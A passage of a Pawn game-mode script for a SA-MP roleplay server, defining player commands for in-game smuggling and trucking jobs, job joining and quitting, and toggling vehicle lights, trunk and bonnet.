	    format(string, sizeof(string), "* %s has loaded %d medium material packages from the pickup.", GetName(playerid), packages);
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		format(string, sizeof(string), "* You have loaded {FF6347}%d medium material{FFFF00} packages for {FF6347}$%d{FFFF00}, deliver them to the Materials Dropoff. (Checkpoint)", packages, packages*300);
	    SendClientMessage(playerid, COLOR_YELLOW, string);
	    SendClientMessage(playerid, COLOR_GRAD2, "** Type /delivermats when you arrive to the checkpoint.");
	    SetPlayerCheckpoint(playerid, 251.6972,-156.0768,1.5703, 3.0);
	    AntiTPTimer[playerid] = SetTimerEx("AntiTPHacks", 30000, false, "d", playerid);
	}
	if(IsPlayerInRangeOfPoint(playerid, 3, 2120.7715,-114.0335,2.1263)) //high mats
   	{
        if(Player[playerid][pMoney] < packages*350) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have enough money on you.");
        if(strval(RPJL(playerid, JOB_WSMUGGLER)) < 5) return SendClientMessage(playerid, COLOR_GRAD2, "Your Weapons Smuggler level is too low to carry high materials.");
   	    if(Player[playerid][pLMPackages]) return SendClientMessage(playerid, COLOR_GRAD2, "You are already carrying packages.");
		if(Player[playerid][pMMPackages]) return SendClientMessage(playerid, COLOR_GRAD2, "You are already carrying packages.");
		if(Player[playerid][pHMPackages]) return SendClientMessage(playerid, COLOR_GRAD2, "You are already carrying packages.");
		Player[playerid][pHMPackages] = 1;
	    GiveZamoraMoney(playerid, -(packages*350));
	    if(PointInfo[3][pOwner])
        {
    		new idx = PointInfo[3][pOwner];
    		FamInfo[idx][fMoney] += packages*350;
    		PointInfo[3][pProfit] += packages*350;
        }
	    format(string, sizeof(string), "* %s has loaded %d high material packages from the pickup.", GetName(playerid), packages);
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		format(string, sizeof(string), "* You have loaded {FF6347}%d high material{FFFF00} packages for {FF6347}$%d{FFFF00}, deliver them to the Materials Dropoff. (Checkpoint)", packages, packages*350);
	    SendClientMessage(playerid, COLOR_YELLOW, string);
	    SendClientMessage(playerid, COLOR_GRAD2, "** Type /delivermats when you arrive to the checkpoint.");
	    SetPlayerCheckpoint(playerid, 34.7790,-2647.2515,40.7285, 3.0);
	    AntiTPTimer[playerid] = SetTimerEx("AntiTPHacks", 30000, false, "d", playerid);
	}
	return 1;
}
IRP:delivermats(playerid, var[])
{
	new string[128], packages, oldj, newj;
	if(Player[playerid][pJobSkill][JOB_WSMUGGLER] < 100) packages = 5;
	else if(Player[playerid][pJobSkill][JOB_WSMUGGLER] < 300) packages = 10;
	else if(Player[playerid][pJobSkill][JOB_WSMUGGLER] < 700) packages = 15;
	else if(Player[playerid][pJobSkill][JOB_WSMUGGLER] < 1200) packages = 20;
	else if(Player[playerid][pJobSkill][JOB_WSMUGGLER] >= 1200) packages = 25;
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pJob] != JOB_WSMUGGLER && Player[playerid][pVIPJob] != JOB_WSMUGGLER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Weapons Smuggler.");
	AntiTPCheck(playerid);
	if(!Player[playerid][pLMPackages] && !Player[playerid][pMMPackages]  && !Player[playerid][pHMPackages]) return SendClientMessage(playerid, COLOR_GRAD2, "You have no packages on you.");
	if(IsPlayerInRangeOfPoint(playerid, 3, 2676.7568,-1542.1117,25.1067))
	{
    	if(Player[playerid][pLMPackages] == 1)//low drop
    	{
	    	Player[playerid][pLMPackages] = 0;
    		oldj = strval(RPJL(playerid,JOB_WSMUGGLER));
    		Player[playerid][pJobSkill][JOB_WSMUGGLER] ++;
    		newj = strval(RPJL(playerid,JOB_WSMUGGLER));
    	    format(string, sizeof(string), "* %s has dropped %d low material packages at the dropoff.", GetName(playerid), packages);
    		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
    		format(string, sizeof(string), "* You have collected {FF6347}%d low materials{FFFF00} from the dropoff.", packages*15);
	        SendClientMessage(playerid, COLOR_YELLOW, string);
    	    Player[playerid][pLMaterials] += packages*15;
    	    if(PointInfo[4][pOwner])
            {
        		new idx = PointInfo[4][pOwner];
        		FamInfo[idx][fMoney] += packages*250;
        		PointInfo[4][pProfit] += packages*250;
            }
    	}
	}
	if(IsPlayerInRangeOfPoint(playerid, 3, 251.6972,-156.0768,1.5703))
	{
    	if(Player[playerid][pMMPackages] == 1)//med drop
    	{
    		Player[playerid][pMMPackages] = 0;
    		oldj = strval(RPJL(playerid,JOB_WSMUGGLER));
    		Player[playerid][pJobSkill][JOB_WSMUGGLER] ++;
    		newj = strval(RPJL(playerid,JOB_WSMUGGLER));
	        format(string, sizeof(string), "* %s has dropped %d medium material packages at the dropoff.", GetName(playerid), packages);
    		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	    	format(string, sizeof(string), "* You have collected {FF6347}%d medium materials{FFFF00} from the dropoff.", packages*20);
    	    SendClientMessage(playerid, COLOR_YELLOW, string);
    	    Player[playerid][pMMaterials] += packages*20;
    	    if(PointInfo[5][pOwner])
            {
        		new idx = PointInfo[5][pOwner];
        		FamInfo[idx][fMoney] += packages*300;
        		PointInfo[5][pProfit] += packages*300;
            }
    	}
	}
	if(IsPlayerInRangeOfPoint(playerid, 3, 34.7790,-2647.2515,40.7285))
	{
    	if(Player[playerid][pHMPackages] == 1)//high drop
    	{
    		Player[playerid][pHMPackages] = 0;
    		oldj = strval(RPJL(playerid,JOB_WSMUGGLER));
    		Player[playerid][pJobSkill][JOB_WSMUGGLER] ++;
    		newj = strval(RPJL(playerid,JOB_WSMUGGLER));
    	    format(string, sizeof(string), "* %s has dropped %d high material packages at the dropoff.", GetName(playerid), packages);
    		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
     		format(string, sizeof(string), "* You have collected {FF6347}%d high materials{FFFF00} from the dropoff.", packages*25);
    	    SendClientMessage(playerid, COLOR_YELLOW, string);
    	    Player[playerid][pHMaterials] += packages*25;
    	    if(PointInfo[6][pOwner])
            {
        		new idx = PointInfo[6][pOwner];
        		FamInfo[idx][fMoney] += packages*350;
        		PointInfo[6][pProfit] += packages*350;
            }
     	}
    }
	if(oldj < newj)
	{
	    format(string, sizeof(string), "** Your Weapons Smuggler level is now %d, you can now carry %d packages. **", newj, newj*5);
		SendClientMessage(playerid, COLOR_YELLOW, string);
	}
	return 1;
}
IRP:checkload(playerid, var[])
{
	new user;
	if(!Logged(playerid)) return NoLogin(playerid);
    if(IsACop(playerid))
	{
    	if(sscanf(var, "u", user)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /checkload [playerid]");
    	if(!Logged(user)) return NoLoginB(playerid);
    	if(!IsPlayerInAnyVehicle(user) || !IsTruckerVehicle(GetPlayerVehicleID(user))) return SendClientMessage(playerid, COLOR_GRAD2, "The player is not .");
    	if(Player[user][pGasProd]) return SendClientMessage(playerid, COLOR_BLUE, "** The truck is loaded with gas cans.");
    	if(Player[user][pFruitProd]) return SendClientMessage(playerid, COLOR_BLUE, "** The truck is loaded with fruits boxes.");
    	if(Player[user][pMatProd]) return SendClientMessage(playerid, COLOR_BLUE, "** The truck is loaded with illegal materials.");
        if(Player[user][pClothProd]) return SendClientMessage(playerid, COLOR_BLUE, "** The truck is loaded with clothes.");
    }
    else
	{
		NoAuth(playerid);
	}
	return 1;
}
IRP:load(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pJob] != JOB_TRUCKER && Player[playerid][pVIPJob] != JOB_TRUCKER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Trucker.");
	if(!IsPlayerInAnyVehicle(playerid) || !IsTruckerVehicle(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_GRAD2, "You are not in a Trucker vehicle.");
   	if(!IsPlayerInRangeOfPoint(playerid, 3, -60.0844,-1112.7158,1.1274) && !IsPlayerInRangeOfPoint(playerid, 3, -63.0331,-1121.3658,1.1607)) return SendClientMessage(playerid, COLOR_GRAD2, "You are not near the load pickup place.");
   	if(sscanf(var,"s[32]", var))
   	{
        SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /load [products]");
   	    SendClientMessage(playerid, COLOR_GRAD2, "[PRODUCTS]: gas | fruits | clothes | materials");
        return 1;
   	}
   	if(!strcmp(var, "gas", true))
   	{
        if(Player[playerid][pGasProd]) return SendClientMessage(playerid, COLOR_GRAD2, "You already have overloaded gas.");
    	Player[playerid][pGasProd] ++;
        Player[playerid][pDeliverTruck] = GetPlayerVehicleID(playerid);
    	TruckPackages[GetPlayerVehicleID(playerid)] = playerid;
    	format(string, sizeof(string), "** You have loaded {FF6347}gas{FFFF00}, deliver them to the gas station. (Checkpoint)");
        SendClientMessage(playerid, COLOR_YELLOW, string);
        SendClientMessage(playerid, COLOR_GRAD2, "** Type /delivery when you arrive to the checkpoint.");
        SetPlayerCheckpoint(playerid, 1917.8790,-1788.5453,13.3906, 2);
       	return 1;
   	}
   	else if(!strcmp(var, "fruits", true))
   	{
        if(Player[playerid][pFruitProd]) return SendClientMessage(playerid, COLOR_GRAD2, "You already have overloaded fruits.");
    	Player[playerid][pFruitProd] ++;
        Player[playerid][pDeliverTruck] = GetPlayerVehicleID(playerid);
    	TruckPackages[GetPlayerVehicleID(playerid)] = playerid;
    	format(string, sizeof(string), "** You have loaded {FF6347}fruits{FFFF00}, deliver them to the market. (Checkpoint)");
        SendClientMessage(playerid, COLOR_YELLOW, string);
        SendClientMessage(playerid, COLOR_GRAD2, "** Type /delivery when you arrive to the checkpoint.");
        SetPlayerCheckpoint(playerid, 1858.4780,-1856.4052,13.1482, 2);
       	return 1;
   	}
   	else if(!strcmp(var, "clothes", true))
   	{
        if(Player[playerid][pClothProd]) return SendClientMessage(playerid, COLOR_GRAD2, "You already have overloaded clothes.");
    	Player[playerid][pClothProd] ++;
        Player[playerid][pDeliverTruck] = GetPlayerVehicleID(playerid);
    	TruckPackages[GetPlayerVehicleID(playerid)] = playerid;
    	format(string, sizeof(string), "** You have loaded {FF6347}clothes{FFFF00}, deliver them to the clothes shop. (Checkpoint)");
        SendClientMessage(playerid, COLOR_YELLOW, string);
        SendClientMessage(playerid, COLOR_GRAD2, "** Type /delivery when you arrive to the checkpoint.");
        SetPlayerCheckpoint(playerid, 2237.7969,-1663.2440,15.4766, 2);
       	return 1;
   	}
   	else if(!strcmp(var, "materials", true))
   	{
        if(Player[playerid][pMatProd]) return SendClientMessage(playerid, COLOR_GRAD2, "You already have overloaded illegal materials.");
    	Player[playerid][pMatProd] ++;
        Player[playerid][pDeliverTruck] = GetPlayerVehicleID(playerid);
    	TruckPackages[GetPlayerVehicleID(playerid)] = playerid;
    	format(string, sizeof(string), "** You have loaded {FF6347}illegal materials{FFFF00}, deliver them to the ammunation. (Checkpoint)");
        SendClientMessage(playerid, COLOR_YELLOW, string);
        SendClientMessage(playerid, COLOR_GRAD2, "** Type /delivery when you arrive to the checkpoint.");
        SetPlayerCheckpoint(playerid, 1364.8677,-1287.1503,13.1086, 2);
       	return 1;
   	}
	return 1;
}

IRP:delivery(playerid, var[])
{
	new string[128];
   	if(!Logged(playerid)) return NoLogin(playerid);
   	if(Player[playerid][pJob] != JOB_TRUCKER && Player[playerid][pVIPJob] != JOB_TRUCKER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not a Trucker.");
	if(!IsPlayerInAnyVehicle(playerid) || !IsTruckerVehicle(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid, COLOR_GRAD2, "You are not in a Trucker vehicle.");
   	if(Player[playerid][pDeliverTruck] != GetPlayerVehicleID(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "This is not the vehicle that your products were loaded to.");
   	if(IsPlayerInRangeOfPoint(playerid, 5, 1917.8790,-1788.5453,13.3906))
   	{
        if(!Player[playerid][pGasProd]) return SendClientMessage(playerid, COLOR_GRAD2, "You aren't carrying gas.");
        GiveZamoraMoney(playerid, 2000);
    	format(string, sizeof(string), "* You have delivered {FF6347}gas{FFFF00} and recievied {FF6347}$2000{FFFF00}");
        SendClientMessage(playerid, COLOR_YELLOW, string);
        Player[playerid][pGasProd] = 0;
	}
    else if(IsPlayerInRangeOfPoint(playerid, 5, 1364.8677,-1287.1503,13.1086))
   	{
        if(!Player[playerid][pMatProd]) return SendClientMessage(playerid, COLOR_GRAD2, "You aren't carrying illegal materials.");
        GiveZamoraMoney(playerid, 3000);
    	format(string, sizeof(string), "* You have delivered {FF6347}illegal materials{FFFF00} and recievied {FF6347}$3000{FFFF00}");
        SendClientMessage(playerid, COLOR_YELLOW, string);
        Player[playerid][pMatProd] = 0;
	}
    else if(IsPlayerInRangeOfPoint(playerid, 5, 2237.7969,-1663.2440,15.4766))
   	{
        if(!Player[playerid][pClothProd]) return SendClientMessage(playerid, COLOR_GRAD2, "You aren't carrying clothes.");
        GiveZamoraMoney(playerid, 2000);
    	format(string, sizeof(string), "* You have delivered {FF6347}clothes{FFFF00} and recievied {FF6347}$2000{FFFF00}");
        SendClientMessage(playerid, COLOR_YELLOW, string);
        Player[playerid][pClothProd] = 0;
    }
    else if(IsPlayerInRangeOfPoint(playerid, 5, 1858.4780,-1856.4052,13.1482))
   	{
        if(!Player[playerid][pFruitProd]) return SendClientMessage(playerid, COLOR_GRAD2, "You aren't carrying fruits.");
        GiveZamoraMoney(playerid, 2000);
    	format(string, sizeof(string), "* You have delivered {FF6347}fruits{FFFF00} and recievied {FF6347}$2000{FFFF00}");
        SendClientMessage(playerid, COLOR_YELLOW, string);
     	Player[playerid][pFruitProd] = 0;
    }
	return 1;
}

IRP:join(playerid, var[])
{
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pJob] && Player[playerid][pVIP] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You already have a job, /quitjob then try again.");
   	if(Player[playerid][pJob] && Player[playerid][pVIPJob] && Player[playerid][pVIP] >= 2) return SendClientMessage(playerid, COLOR_GRAD2, "You already have two jobs, /quitjob then try again.");
    if(IsPlayerInRangeOfPoint(playerid, 2, 2330.0693,-2315.4709,13.5469))
    {
        SendClientMessage(playerid, COLOR_YELLOW, "* If you are sure to become a {FF6347}Mechanic{FFFF00}, type /accept job.");
        GettingJob[playerid] = 1;
    }
    else if(IsPlayerInRangeOfPoint(playerid, 2, 1380.8300,-1088.7698,27.3844))
    {
	    SendClientMessage(playerid, COLOR_YELLOW, "* If you are sure to become a {FF6347}Lawyer{FFFF00}, type /accept job.");
        GettingJob[playerid] = 2;
    }
	else if(IsPlayerInRangeOfPoint(playerid, 2, -76.8260,-1136.7341,1.0781))
	{
	    SendClientMessage(playerid, COLOR_YELLOW, "* If you are sure to become a {FF6347}Trucker{FFFF00}, type /accept job.");
        GettingJob[playerid] = 3;
	}
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2112.5371,-121.4570,2.1263))
	{
	    SendClientMessage(playerid, COLOR_YELLOW, "* If you are sure to become a {FF6347}Weapon Smuggler{FFFF00}, type /accept job.");
        GettingJob[playerid] = 4;
	}
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2097.8765,-111.1796,8.1172))
	{
	    SendClientMessage(playerid, COLOR_YELLOW, "* If you are sure to become a {FF6347}Weapon Dealer{FFFF00}, type /accept job.");
        GettingJob[playerid] = 5;
	}
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2178.5518,-1660.4418,14.9644))
	{
	    SendClientMessage(playerid, COLOR_YELLOW, "* If you are sure to become a {FF6347}Drug Dealer{FFFF00}, type /accept job.");
        GettingJob[playerid] = 6;
	}
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2354.7354,-1170.1056,28.0475))
	{
	    SendClientMessage(playerid, COLOR_YELLOW, "* If you are sure to become a {FF6347}Drug Smuggler{FFFF00}, type /accept job.");
        GettingJob[playerid] = 7;
	}
	else if(IsPlayerInRangeOfPoint(playerid, 2, 2227.9976,-1718.2604,13.5321))
	{
	    SendClientMessage(playerid, COLOR_YELLOW, "* If you are sure to become a {FF6347}Bodyguard{FFFF00}, type /accept job.");
        GettingJob[playerid] = 8;
	}
	else
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You are not near a job location.");
	}
	return 1;
}

IRP:quitjob(playerid, var[])
{
	new string[128], jobid;
   	if(!Logged(playerid)) return NoLogin(playerid);
	if(!Player[playerid][pJob] && Player[playerid][pVIP] < 2) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have a job.");
 	if(Player[playerid][pVIP] >= 2)
	{
		if(sscanf(var, "is[8]", jobid, var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /quitjob [1-2] [confirm]");
		if(jobid == 1 && !Player[playerid][pJob]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have a job at this slot.");
		if(jobid == 2 && !Player[playerid][pVIPJob]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have a job at this slot.");
	}
	else if(sscanf(var, "s[8]", var)) return SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /quitjob [confirm]");
	if(!strcmp(var, "confirm", true))
	{
	    if(Player[playerid][pVIP] >= 2)
	    {
	        if(jobid == 1)
	        {
		        format(string, sizeof(string), "* You have quit the {FF6347}%s {FFFF00}job.", RPJN(playerid));
				SendClientMessage(playerid, COLOR_YELLOW, string);
		    	Player[playerid][pJob] = JOB_NONE;
	        }
			else if(jobid == 2)
			{
		        format(string, sizeof(string), "* You have quit the {FF6347}%s {FFFF00}job.", RPVJN(playerid));
				SendClientMessage(playerid, COLOR_YELLOW, string);
		    	Player[playerid][pVIPJob] = JOB_NONE;
			}
	        return 1;
	    }
	    format(string, sizeof(string), "* You have quit the {FF6347}%s {FFFF00}job.", RPJN(playerid));
		SendClientMessage(playerid, COLOR_YELLOW, string);
	    Player[playerid][pJob] = JOB_NONE;
	}
	return 1;
}


IRP:lights(playerid, param[])
{
	new string[128], idx;
	if(!Logged(playerid)) return NoLogin(playerid);
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_GRAD2, "You are not driving a vehicle.");
    idx = GetPlayerVehicleID(playerid);
    new engine, lights, alarm, doors, bonnet, boot, objective;
	GetVehicleParamsEx(idx, engine, lights, alarm, doors, bonnet, boot, objective);
	if(!lights)
	{
	    SetVehicleParamsEx(idx, engine, 1, alarm, doors, bonnet, boot, objective);
	    format(string, sizeof(string), "* %s turns their vehicle's lights on.", GetName(playerid));
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		GameTextForPlayer(playerid, "~g~Lights On", 3500, 3);
	}
	else
	{
	    SetVehicleParamsEx(idx, engine, 0, alarm, doors, bonnet, boot, objective);
	    format(string, sizeof(string), "* %s turns their vehicle's lights off.", GetName(playerid));
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		GameTextForPlayer(playerid, "~r~Lights Off", 3500, 3);
	}
	return 1;
}
IRP:trunk(playerid, var[])
{
	new string[128], done, idx;
	if(!Logged(playerid)) return NoLogin(playerid);
	if(Player[playerid][pVeh] || Player[playerid][pVVeh] || Player[playerid][pVVVeh] || Player[playerid][pVVVVeh])
    {
        new Float:vx, Float:vy, Float:vz;
	    GetVehiclePos(Player[playerid][pVeh], vx, vy, vz);
	    if(IsPlayerInRangeOfPoint(playerid, 4, vx, vy, vz))
	    {
	        idx = Player[playerid][pVeh];
	        new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(idx, engine, lights, alarm, doors, bonnet, boot, objective);
			if(!boot)
			{

			    SetVehicleParamsEx(idx, engine, lights, alarm, doors, bonnet, 1, objective);
			    format(string, sizeof(string), "* %s opens their vehicle's trunk.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~g~Trunk Opened", 3500, 3);
				topened[playerid] = 1;
			}
			else
			{
			    SetVehicleParamsEx(idx, engine, lights, alarm, doors, bonnet, 0, objective);
			    format(string, sizeof(string), "* %s closes their vehicle's trunk.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~r~Trunk Closed", 3500, 3);
				topened[playerid] = 0;
			}
			done = 1;
			return 1;
	    }
	    // Second Vehicle
	    GetVehiclePos(Player[playerid][pVVeh], vx, vy, vz);
	    if(IsPlayerInRangeOfPoint(playerid, 4, vx, vy, vz))
	    {
	        idx = Player[playerid][pVVeh];
	        new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(idx, engine, lights, alarm, doors, bonnet, boot, objective);
			if(!boot)
			{

			    SetVehicleParamsEx(idx, engine, lights, alarm, doors, bonnet, 1, objective);
			    format(string, sizeof(string), "* %s opens their vehicle's trunk.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~g~Trunk Opened", 3500, 3);
				topened[playerid] = 1;
			}
			else
			{
			    SetVehicleParamsEx(idx, engine, lights, alarm, doors, bonnet, 0, objective);
			    format(string, sizeof(string), "* %s closes their vehicle's trunk.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~r~Trunk Closed", 3500, 3);
				topened[playerid] = 0;
			}
			done = 1;
	    }
	    // Third Vehicle
	    GetVehiclePos(Player[playerid][pVVVeh], vx, vy, vz);
	    if(IsPlayerInRangeOfPoint(playerid, 4, vx, vy, vz))
	    {
	        idx = Player[playerid][pVVVeh];
	        new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(idx, engine, lights, alarm, doors, bonnet, boot, objective);
			if(!boot)
			{

			    SetVehicleParamsEx(idx, engine, lights, alarm, doors, bonnet, 1, objective);
			    format(string, sizeof(string), "* %s opens their vehicle's trunk.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~g~Trunk Opened", 3500, 3);
				topened[playerid] = 1;
			}
			else
			{
			    SetVehicleParamsEx(idx, engine, lights, alarm, doors, bonnet, 0, objective);
			    format(string, sizeof(string), "* %s closes their vehicle's trunk.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~r~Trunk Closed", 3500, 3);
				topened[playerid] = 0;
			}
			done = 1;
	    }
	    // Fourth Vehicle
	    GetVehiclePos(Player[playerid][pVVVVeh], vx, vy, vz);
	    if(IsPlayerInRangeOfPoint(playerid, 4, vx, vy, vz))
	    {
	        idx = Player[playerid][pVVVVeh];
	        new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(idx, engine, lights, alarm, doors, bonnet, boot, objective);
			if(!boot)
			{

			    SetVehicleParamsEx(idx, engine, lights, alarm, doors, bonnet, 1, objective);
			    format(string, sizeof(string), "* %s opens their vehicle's trunk.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~g~Trunk Opened", 3500, 3);
				topened[playerid] = 1;
			}
			else
			{
			    SetVehicleParamsEx(idx, engine, lights, alarm, doors, bonnet, 0, objective);
			    format(string, sizeof(string), "* %s closes their vehicle's trunk.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~r~Trunk Closed", 3500, 3);
				topened[playerid] = 0;
			}
			done = 1;
	    }
	    if(!done) SendClientMessage(playerid, COLOR_GRAD2, "You are not near a vehicle you own.");
	}
	else
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You don't own any vehicle.");
	    return 1;
	}

	return 1;
}
IRP:bonnet(playerid, var[])
{
	new string[256], done, idx;
	if(!Logged(playerid)) NoLogin(playerid);
	if(Player[playerid][pVeh] || Player[playerid][pVVeh] || Player[playerid][pVVVeh] || Player[playerid][pVVVVeh])
    {
        new Float:vx, Float:vy, Float:vz;
	    GetVehiclePos(Player[playerid][pVeh], vx, vy, vz);
	    if(IsPlayerInRangeOfPoint(playerid, 4, vx, vy, vz))
	    {
	        idx = Player[playerid][pVeh];
	        new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(idx, engine, lights, alarm, doors, bonnet, boot, objective);
			if(!bonnet)
			{
			    SetVehicleParamsEx(idx, engine, lights, alarm, doors, 1, boot, objective);
			    format(string, sizeof(string), "* %s opens their vehicle's bonnet.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~g~Bonnet Opened", 3500, 3);
			}
			else
			{
			    SetVehicleParamsEx(idx, engine, lights, alarm, doors, 0, boot, objective);
			    format(string, sizeof(string), "* %s closes their vehicle's bonnet.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~r~Bonnet Closed", 3500, 3);
			}
			done = 1;
			return 1;
	    }
	    GetVehiclePos(Player[playerid][pVVeh], vx, vy, vz);
	    if(IsPlayerInRangeOfPoint(playerid, 4, vx, vy, vz))
	    {
	        idx = Player[playerid][pVVeh];
	        new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(idx, engine, lights, alarm, doors, bonnet, boot, objective);
			if(!bonnet)
			{

			    SetVehicleParamsEx(idx, engine, lights, alarm, doors, 1, boot, objective);
			    format(string, sizeof(string), "* %s opens their vehicle's bonnet.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~g~Bonnet Opened", 3500, 3);
			}
			else
			{
			    SetVehicleParamsEx(idx, engine, lights, alarm, doors, 0, boot, objective);
			    format(string, sizeof(string), "* %s closes their vehicle's bonnet.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~r~Bonnet Closed", 3500, 3);
			}
			done = 1;
	    }
	    GetVehiclePos(Player[playerid][pVVVeh], vx, vy, vz);
	    if(IsPlayerInRangeOfPoint(playerid, 4, vx, vy, vz))
	    {
	        idx = Player[playerid][pVVVeh];
	        new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(idx, engine, lights, alarm, doors, bonnet, boot, objective);
			if(!bonnet)
			{

			    SetVehicleParamsEx(idx, engine, lights, alarm, doors, 1, boot, objective);
			    format(string, sizeof(string), "* %s opens their vehicle's bonnet.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~g~Bonnet Opened", 3500, 3);
			}
			else
			{
			    SetVehicleParamsEx(idx, engine, lights, alarm, doors, 0, boot, objective);
			    format(string, sizeof(string), "* %s closes their vehicle's bonnet.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~r~Bonnet Closed", 3500, 3);
			}
			done = 1;
	    }
	    GetVehiclePos(Player[playerid][pVVVVeh], vx, vy, vz);
	    if(IsPlayerInRangeOfPoint(playerid, 4, vx, vy, vz))
	    {
	        idx = Player[playerid][pVVVVeh];
	        new engine, lights, alarm, doors, bonnet, boot, objective;
			GetVehicleParamsEx(idx, engine, lights, alarm, doors, bonnet, boot, objective);
			if(!bonnet)
			{

			    SetVehicleParamsEx(idx, engine, lights, alarm, doors, 1, boot, objective);
			    format(string, sizeof(string), "* %s opens their vehicle's bonnet.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
				GameTextForPlayer(playerid, "~g~Bonnet Opened", 3500, 3);
			}
			else
			{
			    SetVehicleParamsEx(idx, engine, lights, alarm, doors, 0, boot, objective);
			    format(string, sizeof(string), "* %s closes their vehicle's bonnet.", GetName(playerid));
				SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
